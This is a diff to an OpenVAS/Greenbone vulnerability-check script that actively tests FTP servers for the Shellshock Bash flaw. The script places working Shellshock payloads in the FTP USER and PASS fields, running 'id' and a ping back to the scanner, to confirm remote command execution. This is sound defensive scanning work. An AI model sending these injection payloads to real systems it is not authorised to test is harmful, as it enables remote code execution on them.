@@ -1,44 +1,49 @@
-# Copyright (C) 2014 Greenbone Networks GmbH
+# SPDX-FileCopyrightText: 2014 Greenbone AG
 # Some text descriptions might be excerpted from (a) referenced
 # source(s), and are Copyright (C) by the respective right holder(s).
 #
-# SPDX-License-Identifier: GPL-2.0-or-later
-#
-# This program is free software; you can redistribute it and/or
-# modify it under the terms of the GNU General Public License
-# as published by the Free Software Foundation; either version 2
-# of the License, or (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program; if not, write to the Free Software
-# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+# SPDX-License-Identifier: GPL-2.0-only
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105094");
-  script_version("2022-08-09T10:11:17+0000");
-  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
-  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
-  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
+  script_version("2024-11-13T05:05:39+0000");
+  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
+  script_tag(name:"creation_date", value:"2014-09-30 11:47:16 +0530 (Tue, 30 Sep 2014)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"2022-08-09 10:11:17 +0000 (Tue, 09 Aug 2022)");
   script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
   script_tag(name:"severity_origin", value:"NVD");
   script_tag(name:"severity_date", value:"2021-02-01 21:38:00 +0000 (Mon, 01 Feb 2021)");
-  script_tag(name:"creation_date", value:"2014-09-30 11:47:16 +0530 (Tue, 30 Sep 2014)");
+
+  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
+
+  script_tag(name:"qod_type", value:"remote_vul");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+
+  script_category(ACT_ATTACK);
+
+  script_copyright("Copyright (C) 2014 Greenbone AG");
+  script_family("FTP");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl");
+  script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp/banner/available");
 
   script_name("GNU Bash Environment Variable Handling RCE Vulnerability (Shellshock, FTP, CVE-2014-6271/CVE-2014-6278) - Active Check");
 
   script_tag(name:"summary", value:"GNU Bash is prone to a remote command execution (RCE)
   vulnerability dubbed 'Shellshock'.");
 
-  script_tag(name:"vuldetect", value:"Sends a crafted FTP login request and checks the response.");
+  script_tag(name:"vuldetect", value:"Two different methods are used:
+
+  1. Sends a crafted FTP login request and checks the response.
+
+  2. Sends a crafted FTP login request and checks if the target is connecting back to the scanner
+  host.
+
+  Note: For a successful detection of this flaw via the second method the scanner host needs to be
+  able to directly receive ICMP echo requests from the target.");
 
   script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered when evaluating
   environment variables passed from another environment. After processing a function definition,
@@ -62,16 +67,8 @@ if(description)
   script_xref(name:"URL", value:"https://shellshocker.net/");
   script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/252743");
   script_xref(name:"URL", value:"https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc");
-
-  script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
-  script_family("FTP");
-  script_dependencies("ftpserver_detect_type_nd_version.nasl");
-  script_require_ports("Services/ftp", 21);
-  script_mandatory_keys("ftp/banner/available");
-
-  script_tag(name:"qod_type", value:"remote_vul");
-  script_tag(name:"solution_type", value:"VendorFix");
+  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
+  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
 
   exit(0);
 }
@@ -79,80 +76,93 @@ if(description)
 include("ftp_func.inc");
 include("misc_func.inc");
 include("port_service_func.inc");
-
-id_users = make_list( '() { :; }; export PATH=/bin:/usr/bin; echo; echo; id;',
-                      '() { _; } >_[$($())] {  export PATH=/bin:/usr/bin; echo; echo; id;; }' );
+include("dump.inc");
+include("list_array_func.inc");
+include("pcap_func.inc");
 
 port = ftp_get_port( default:21 );
 
-foreach id_user ( id_users )
-{
+id_users = make_list( "() { :; }; export PATH=/bin:/usr/bin; echo; echo; id;",
+                      "() { _; } >_[$($())] {  export PATH=/bin:/usr/bin; echo; echo; id;; }" );
+
+foreach id_user( id_users ) {
+
   id_pass = id_user;
 
-  soc = ftp_open_socket( port:port );
-  if( ! soc )
-    break;
+  if( ! soc = ftp_open_socket( port:port ) )
+    continue;
 
-  send(socket:soc, data:'USER ' + id_user + '\r\n');
+  send( socket:soc, data:"USER " + id_user + '\r\n' );
   recv = recv( socket:soc, length:1024 );
 
-  send(socket:soc, data:'PASS ' + id_pass + '\r\n');
+  send( socket:soc, data:"PASS " + id_pass + '\r\n' );
   recv += recv( socket:soc, length:1024 );
 
   ftp_close( socket:soc );
 
-  if( recv =~ "uid=[0-9]+.*gid=[0-9]+.*" )
-  {
-    VULN = TRUE;
-    break;
+  if( ! recv )
+    continue;
+
+  if( recv =~ "uid=[0-9]+.*gid=[0-9]+.*" ) {
+    report = 'By sending a special request it was possible to execute `' + id_user + '` on the remote host.\n\nReceived answer:\n\n' + recv;
+    security_message( port:port, data:report );
+    exit( 0 );
   }
 }
 
-if( ! VULN )
-{
+ownhostname = this_host_name();
+ownip = this_host();
+src_filter = pcap_src_ip_filter_from_hostnames();
+dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );
+filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );
+
+foreach connect_back_target( make_list( ownip, ownhostname ) ) {
+
   vtstrings = get_vt_strings();
   str = vtstrings["ping_string"];
   pattern = hexstr( str );
-  p_users = make_list(
-                      '() { :; }; export PATH=/bin:/usr/bin; ping -p ' + pattern + ' -c3 ' + this_host(),
-                      '{ _; } >_[$($())] { export PATH=/bin:/usr/bin; ping -p ' + pattern + ' -c3 ' + this_host() + '; }'
-                     );
+  p_users = make_list( "() { :; }; export PATH=/bin:/usr/bin; ping -p " + pattern + " -c3 " + connect_back_target,
+                       "{ _; } >_[$($())] { export PATH=/bin:/usr/bin; ping -p " + pattern + " -c3 " + connect_back_target + "; }" );
 
-  foreach user ( p_users )
-  {
-    soc = ftp_open_socket( port:port );
-    if( ! soc )
-      break;
+  foreach user( p_users ) {
+
+    # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple
+    # hostnames / vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(),
+    # ...). Reason: If the fork would be done after calling open_sock_tcp() the child's would
+    # share the same socket causing race conditions and similar.
+    #
+    # In this case this also includes pcap_src_ip_filter_from_hostnames() from above.
+    if( ! soc = ftp_open_socket( port:port ) )
+      continue;
 
     pass = user;
 
-    send(socket:soc, data:'USER ' + user + '\r\n');
-    recv = recv( socket:soc, length:1024 );
-    send(socket:soc, data:'PASS ' + pass + '\r\n');
+    send( socket:soc, data:"USER " + user + '\r\n' );
+    recv( socket:soc, length:1024 );
+    send( socket:soc, data:"PASS " + pass + '\r\n' );
 
-    res = send_capture( socket:soc,
-                        data:"",
-                        pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() )
-                       );
+    res = send_capture( socket:soc, data:"", pcap_filter:filter );
+
     ftp_close( socket:soc );
 
     if( ! res  )
       continue;
 
-    data = get_icmp_element( icmp:res, element:"data" );
+    type = get_icmp_element( icmp:res, element:"icmp_type" );
+    if( ! type || type != 8 )
+      continue;
 
-    if( str >< data)
-    {
-      VULN = TRUE;
-      break;
+    if( ! data = get_icmp_element( icmp:res, element:"data" ) )
+      continue;
+
+    if( str >< data ) {
+      report = 'By sending a special request it was possible to execute `' + user + '` on the remote host.\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
 
-if( VULN )
-{
-  security_message( port:port );
-  exit( 0 );
-}
-
-exit( 99 );
+# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
+# host isn't reachable by the target host or another IP is responding from our request.
+exit( 0 );
